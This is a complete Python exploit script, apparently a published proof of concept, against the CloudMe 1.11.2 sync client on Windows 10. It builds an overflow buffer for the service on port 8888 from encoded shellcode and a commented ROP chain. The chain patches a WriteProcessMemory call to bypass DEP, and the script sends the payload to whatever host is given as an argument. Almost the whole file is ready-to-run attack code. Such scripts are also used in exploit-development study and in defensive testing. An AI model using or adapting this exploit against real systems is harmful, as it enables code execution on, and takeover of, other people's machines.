#!/usr/bin/python
# Exploit Author: Xavier Lim (TrickDKing)
# Vendor Homepage:https://www.cloudme.com/en
# Software: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Category: Local
# Tested on: Windows 10 Pro x64

import socket, sys
from struct import pack

try:
    server = sys.argv[1]
    port = 8888
    size = 2000

    # Read executable memory region is found at 0x0044b0e0 in q5gui but needs to be manually patched
    # Found qt5sql.dll has executable memory region at 0x6d9ed3f0, do not require patch
    wpm  = pack("<L", (0x46464646))  # Dummy WriteProcessMemory Address (Address of IAT entry containing WPM)
    wpm += pack("<L", (0x6d9ed3f0))  # Shellcode Return Address (Return address after executing WPM) 
    wpm += pack("<L", (0xFFFFFFFF))  # Pseudo Process handle (0xFFFFFFFF is set, it is -1 for the current process) Value of hProcess
    wpm += pack("<L", (0x6d9ed3f0))  # Code cave address (Shellcode RET Address) (Value of lpBaseAddress)
    wpm += pack("<L", (0x49494949))  # Dummy lpBuffer (Stack address) 
    wpm += pack("<L", (0x50505050))  # Dummy nSize 
    wpm += pack("<L", (0x51515151))  # lpNumberOfBytesWritten 

    # Bad characters: 0x00
    shellcode =  b""
    shellcode += b"\xbf\x1b\x5d\xc4\xec\xda\xc9\xd9\x74\x24\xf4"
    shellcode += b"\x5b\x31\xc9\xb1\x7f\x31\x7b\x12\x83\xeb\xfc"
    shellcode += b"\x03\x60\x53\x26\x19\x6a\x83\x29\xe2\x92\x54"
    shellcode += b"\x56\x6a\x77\x65\x44\x08\xfc\xd4\x58\x5a\x50"
    shellcode += b"\xd5\x13\x0e\x40\xea\x94\xe5\x4e\xc5\x25\x72"
    shellcode += b"\xfc\x0d\xeb\x45\xac\x72\x6a\x3a\xae\xa6\x4c"
    shellcode += b"\x03\x61\xbb\x8d\x44\x34\xb1\x62\x18\x91\xb2"
    shellcode += b"\x2f\x8d\x96\x87\xf3\xac\x78\x8c\x4c\xd7\xfd"
    shellcode += b"\x53\x38\x6b\xfc\x83\x4a\x3b\xe6\x73\xc6\xe4"
    shellcode += b"\x36\x75\x0b\x91\xff\x01\x97\xd3\x74\xdd\x6c"
    shellcode += b"\xd2\x75\x1f\xa5\x24\x49\xe1\x86\x4a\xe5\xe3"
    shellcode += b"\xdf\x6d\x15\x96\x2b\x8e\xa8\xa1\xef\xec\x76"
    shellcode += b"\x27\xf0\x57\xfd\x9f\xd4\x66\xd2\x46\x9e\x65"
    shellcode += b"\x9f\x0d\xf8\x69\x1e\xc1\x72\x95\xab\xe4\x54"
    shellcode += b"\x1f\xef\xc2\x70\x7b\xb4\x6b\x20\x21\x1b\x93"
    shellcode += b"\x32\x8d\xc4\x31\x38\x3c\x13\x45\xc1\xbe\x1c"
    shellcode += b"\x1b\x56\x2f\x87\xd0\xa6\xc7\x30\x70\xc9\x7e"
    shellcode += b"\xea\xea\x59\xf6\x34\xec\x9e\x2d\x09\x29\x33"
    shellcode += b"\x9d\x3a\x9e\xe7\xc9\xe8\x20\x08\x0a\x5d\x4e"
    shellcode += b"\x72\x63\x31\xfc\xe3\x5c\xfc\xd2\xd3\x82\xd6"
    shellcode += b"\x67\x75\xa0\x4f\x16\x01\x49\xfc\x8e\xd2\xb5"
    shellcode += b"\x4b\x21\x51\xd3\x27\x9d\xd4\x7a\xd4\xfd\xa9"
    shellcode += b"\x2f\x3a\xa6\x15\xe1\x0e\x78\x62\x3a\x4e\xf6"
    shellcode += b"\xfc\x06\xbf\xc4\x34\x59\x8f\x01\x15\xe2\x8a"
    shellcode += b"\x32\x3e\x83\x7b\x87\xf0\x6a\xb3\xd7\xc1\xbc"
    shellcode += b"\x82\x37\x64\xd4\x96\x52\x0e\x49\x2e\xb2\xff"
    shellcode += b"\xa7\xfa\xe2\xcf\xc7\x6a\xc1\x79\xb1\xcd\xca"
    shellcode += b"\x53\x12\x42\x5f\x5f\xc6\x37\xf7\xcf\xf7\xb7"
    shellcode += b"\x07\x18\xbb\xb7\x07\xd8\xeb\x83\x72\x9f\xc6"
    shellcode += b"\xb9\x2b\x6a\x5e\x4b\x83\xc5\xca\xf5\x52\xaf"
    shellcode += b"\x5d\xab\xe3\x59\x26\x1d\x9b\x93\x8b\xe5\x27"
    shellcode += b"\xee\x8a\xa0\xf2\x78\x4b\x7a\xa2\xe3\xa4\x4f"
    shellcode += b"\x35\x8b\x98\xf7\x93\x24\x4b\x66\x70\xf3\x39"
    shellcode += b"\x24\xc4\x54\x89\xf8\xb9\x15\x8d\x67\x26\xf3"
    shellcode += b"\x21\x30\xfc\x79\xba\xee\x68\x29\x33\x91\xaf"
    shellcode += b"\x2a\x96\x24\xe9\x86\x71\x36\xf4\x40\x06\x65"
    shellcode += b"\xab\xc3\x51\xda\x1d\x8c\xb6\x89\x8f\x77\xb6"
    shellcode += b"\xe4\x46\xed\x42\x59\x34\xa1\x01\x36\xec\x2d"
    shellcode += b"\x8b\xbe\x08\xd5\x2c\x6b\xad\xe9\xa6\x87\xc6"
    shellcode += b"\x61\x5b\xa7\x16\x1a\x18\x57\x23\x3a\x5f\x42"
    shellcode += b"\x03\xcf\x41\x84\xd5\x2f\x82\x54\x8c\x6f\xea"
    shellcode += b"\x54\x40\x70\xea\x3c\x60\x70\xaa\xbc\x33\x18"
    shellcode += b"\x72\x18\xe0\x3d\x7d\xb5\x94\xed\xd1\xbc\x7c"
    shellcode += b"\x46\xbe\xbe\xa2\x69\x3e\xed\xf4\x01\x2c\x87"
    shellcode += b"\x70\x33\xaf\x72\x07\x74\x24\xb3\x83\x72\xc4"
    shellcode += b"\x88\x11\xbc\xb3\xeb\x42\xfe\x63\x1b\x0d\xff"
    shellcode += b"\x63\x24\xc3\xc8\xa9\xf4\x15\x01\xe0\x30\x78"
    shellcode += b"\x5c\xce\x78\x84\x25\xde\xcd\x26\x0f\x75\x2d"
    shellcode += b"\x74\x4f\x5c"
    shellcode += b"\x90" * 20 # NOPs to divide EIP and shellcode

    inputBuffer = b"\x90" * (1052 - len(wpm) - len(shellcode))
    # ROP gadgets are from Qt5Gui.dll
    # Command: rp-win-x86.exe -f Qt5Gui.dll -r 5 > rop.txt
    
    # Preserving the stack address
    eip = pack("<L", (0x61bd4a1e))   # push esp ; pop ebx ; pop esi ; ret ;
    rop = pack("<L", (0x90909090))   # Stack alignment for pop esi
    rop += pack("<L", (0x61b7eae4))  # mov eax, ebx ; pop ebx ; ret ;
    rop += pack("<L", (0x90909090))  # Stack alignment for pop ebx
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += pack("<L", (0xfffffbd8))  # -0n1056 to pop into ecx
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ; # ROP skeleton is is in EAX
    # End of preserving the stack address

    # Start of patching WriteProcessMemory address
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += pack("<L", (0x6210b05c))  # IAT address for KERNEL32!GetCurrentProcess
    rop += pack("<L", (0x61eeecfe))  # mov eax,  [ecx] ; ret ; # IAT of KERNEL32!GetCurrentProcess in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; #  Make a copy of the IAT in ECX
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffebb10))  # Negative of 0x000144f0 or 0n83184
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # Hex value 0x144f0 in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ; # IAT of KERNEL32!WriteProcessMemory in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Make a copy of the IAT to ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; ROP skeleton dummy WPM is overwritten
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching WriteProcessMemory address dummy value 0x46464646

    # Start of patching lpBuffer (Base pointer of the shellcode) Dummy value 0x49494949
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffffff0))  # Negative value of 0n16 or 0x10
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n16 in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Make a copy of 0n16 in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Copy of ROP skeleton to ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffffe13))  # Negative value of 0n277 or 0x546
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n1350 in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # stack address in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; ROP skeleton dummy lpBuffer is overwritten
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching lpBuffer address dummy value 0x49494949

    # Start of patching nSize 0x50505050
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ; # Negative value of 0n528 or 0x210
    rop += pack("<L", (0xfffffccc))  #  Negative value of 0n820
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n820 in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # 0n528 in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; # ROP skeleton dummy nSize is overwritten
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching nSize 0x50505050

    # Start of patching lpNumberOfBytesWritten dummy value 0x51515151
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ec26c0))  # xor eax, eax ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; # ROP skeleton dummy lpNumberOfBytesWritten is overwritten
    # End of patching lpNumberOfBytesWritten dummy value 0x51515151

    # Realignment back to start of ROP skeleton
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    rop += pack("<L", (0xfffffff0))  # 
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;

    # Redirect execution flow to WPM function
    rop += pack("<L", (0x61d81114))  # xchg eax, esp ; ret ; 

    padding = b"\x90" * 20
    
    # WPM is offset 000144f0 away from GetCurrentProcess
    
    filler = b"\x90" * (size - len(wpm) - len(inputBuffer) - len(eip) - len(rop)- len(padding) - len(shellcode))

    payload = wpm
    payload += inputBuffer
    payload += shellcode
    payload += eip
    payload += rop
    payload += padding
    payload += filler

    print("WPM Skeleton Length", len(wpm))
    print("Shellcode length",len(shellcode))
    print("Input buffer length",len(inputBuffer))
    print("EIP gadget length",len(eip))
    print("ROP gadgets length",len(rop))
    print("Padding length",len(padding))
    print("Filler length",len(filler))
    print("Total payload size", len(payload))
    
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
  
    print("Done!")
  
except socket.error:
    print("Could not connect!")
